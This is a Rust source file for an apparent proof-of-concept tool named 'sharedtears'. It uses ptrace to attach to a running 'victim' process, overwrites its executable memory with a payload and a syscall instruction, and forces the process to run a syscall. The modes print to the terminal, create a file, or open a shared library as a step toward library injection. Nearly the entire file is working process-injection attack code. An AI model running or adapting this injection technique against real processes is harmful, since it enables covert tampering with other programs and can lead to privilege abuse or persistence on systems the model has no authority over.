use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::Pid;
use std::env;
use std::fs;

fn main() -> nix::Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("usage: ./sharedtears <pid> <mode>");
        println!("modes: ");
        println!("  1 - visible message (print to victim's terminal)");
        println!("  2 - touch attack (create /tmp/success.txt)");
        println!("  3 - so injection (open file handle to <so_lib_path>)");
        return Ok(());
    }

    let pid = Pid::from_raw(args[1].parse::<i32>().unwrap());
    let mode = args[2].as_str();

    ptrace::attach(pid).expect("[-] attach failed.");
    waitpid(pid, None).expect("[-] wait failed.");
    let mut regs = ptrace::getregs(pid).expect("[-] getregs failed.");
    let old_regs = regs.clone();
    let maps = fs::read_to_string(format!("/proc/{}/maps", pid)).unwrap();
    let exec_mem = maps.lines()
        .find(|line| line.contains("r-xp"))
        .map(|line| u64::from_str_radix(line.split('-').next().unwrap(), 16).unwrap())
        .expect("[-] no executable memory found.");

    let (rax, rdi, rsi, rdx, payload) = match mode {
        "1" => {
            (1, 1, exec_mem, 9, "success.\n\0")
        },
        "2" => {
            (2, exec_mem, 64 | 1, 0o666, "/tmp/success.txt\0")
        },
        "3" => {
            (2, exec_mem, 0, 0, "/home/<user>/sharedtears/so-gen/target/release/libso_gen.so\0") // edit this
        },
        _ => {
            println!("[-] invalid mode");
            ptrace::detach(pid, None).unwrap();
            return Ok(());
        }
    };

    unsafe {
        let bytes = payload.as_bytes();
        for (i, chunk) in bytes.chunks(8).enumerate() {
            let mut data = [0u8; 8];
            data[..chunk.len()].copy_from_slice(chunk);
            ptrace::write(pid, (exec_mem + (i as u64 * 8)) as *mut _, u64::from_ne_bytes(data) as *mut _).unwrap();
        }
        ptrace::write(pid, (exec_mem + 256) as *mut _, 0x050f as *mut _).unwrap();
    }

    regs.rax = rax;
    regs.rdi = rdi;
    regs.rsi = rsi;
    regs.rdx = rdx;
    regs.rip = exec_mem + 256;
    ptrace::setregs(pid, regs).expect("[-] setregs failed.");
    ptrace::step(pid, None).expect("[-] step failed.");
    waitpid(pid, None).expect("[-] wait failed.");

    let result_rax = ptrace::getregs(pid).expect("[-] get result failed.").rax;
    println!("[!] syscall result (rax): {}", result_rax);

    ptrace::setregs(pid, old_regs).expect("[-] failed to restore original state.");
    ptrace::detach(pid, None).expect("[-] detach failed.");
    println!("[+] execution complete. process stability maintained.");

    Ok(())
}
